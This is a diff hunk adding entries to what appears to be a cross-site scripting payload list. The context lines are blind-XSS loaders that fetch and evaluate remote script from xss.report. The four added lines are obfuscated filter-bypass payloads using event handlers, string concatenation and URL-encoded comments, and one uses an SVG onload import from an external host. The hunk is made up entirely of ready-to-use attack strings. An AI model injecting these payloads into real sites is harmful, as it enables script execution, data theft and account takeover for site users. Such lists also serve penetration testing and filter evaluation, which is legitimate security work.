@@ -2676,3 +2676,7 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.re
 <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//xss.report/c/department");a.send();</script>
 <script>$.getScript("//xss.report/c/department")</script>
 var a=document.createElement("script");a.src="https://xss.report/c/department";document.body.appendChild(a);
+<<https:http://x55.is/onfocus=1?import(tagName):1 AutoFocus ContentEditable>>
+<input accesskey=X onclick="self['wind'+'ow']['one'+'rror']=alert;throw 1337;">
+'"><Svg Src=//server OnLoad=import(this.getAttribute('src')+0)>
+"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
